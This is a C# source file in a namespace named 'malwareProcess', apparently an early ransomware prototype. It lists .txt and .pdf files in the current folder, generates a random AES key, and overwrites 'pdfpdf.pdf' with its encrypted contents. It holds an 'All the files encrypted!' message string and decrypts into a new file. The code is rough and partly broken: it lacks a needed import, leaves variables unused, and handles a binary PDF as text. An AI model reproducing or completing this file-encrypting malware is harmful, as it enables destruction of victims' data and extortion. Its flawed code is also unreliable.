using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

using System.Text;
using System.Threading;
using System.Security.Cryptography;  


namespace malwareProcess {
class program {

     

   public static void Main(string[] args) {
        AesManaged aesx = new AesManaged();
        
        // it shows that your current directory location.
        string path = Directory.GetCurrentDirectory();

        string[] array1 = Directory.GetFiles(@path);
        string txt = ".txt";
        string pdf = ".pdf";
        string docx = ".docx";

        List <string> files = new List<string>();

        foreach(string a in array1) {
            if(a.Contains(txt) || a.Contains(pdf)) {
                     files.Add(a); 
            }
          
       }
       foreach(string ab in files) {
            Console.WriteLine(ab);
          
       }
       
    string plain_text_file = path + "/file.txt";
    string encrypted_file = path + "/encrypted_file.txt";
    string decrypted_file = path + "/decrypted_file.txt";

   



   // Generate a random key and initialization vector
            var aes = Aes.Create();
            aes.GenerateKey();
            aes.GenerateIV();

            // Encrypt the message
            string message = "All the files encrypted!";
          
            string readText= File.ReadAllText("pdfpdf.pdf");
            // Console.WriteLine(readText);
            byte[] encryptedMessage = EncryptString(readText, aes.Key, aes.IV);
            
            bool yazdir = ByteArrayToFile("pdfpdf.pdf",encryptedMessage);

    
            // Decrypt the message
            string decryptedMessage = DecryptString(encryptedMessage, aes.Key, aes.IV);
            File.WriteAllText("yenipdf.pdf",decryptedMessage);
            

            
 }
     


static public bool ByteArrayToFile(string fileName, byte[] byteArray)
{
    try
    {
        using (var fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
        {
            fs.Write(byteArray, 0, byteArray.Length);
            return true;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine("Exception caught in process: {0}", ex);
        return false;
    }
}

static byte[] EncryptString(string plaintext, byte[] key, byte[] iv)
        {
            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                // Create an encryptor to perform the stream transform.
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for encryption.
                using (var msEncrypt = new System.IO.MemoryStream())
                {
                    using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (var swEncrypt = new System.IO.StreamWriter(csEncrypt))
                        {
                            //Write all data to the stream.
                            swEncrypt.Write(plaintext);
                            
                        }
                        return msEncrypt.ToArray();
                    }
                }
            }
        }

        static string DecryptString(byte[] ciphertext, byte[] key, byte[] iv)
        {
            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (var msDecrypt = new System.IO.MemoryStream(ciphertext))
                {
                    using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (var srDecrypt = new System.IO.StreamReader(csDecrypt))
                        {
                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            return srDecrypt.ReadToEnd();
                        }
                   

 }


    
}
            }
        }
}

}


    
    

        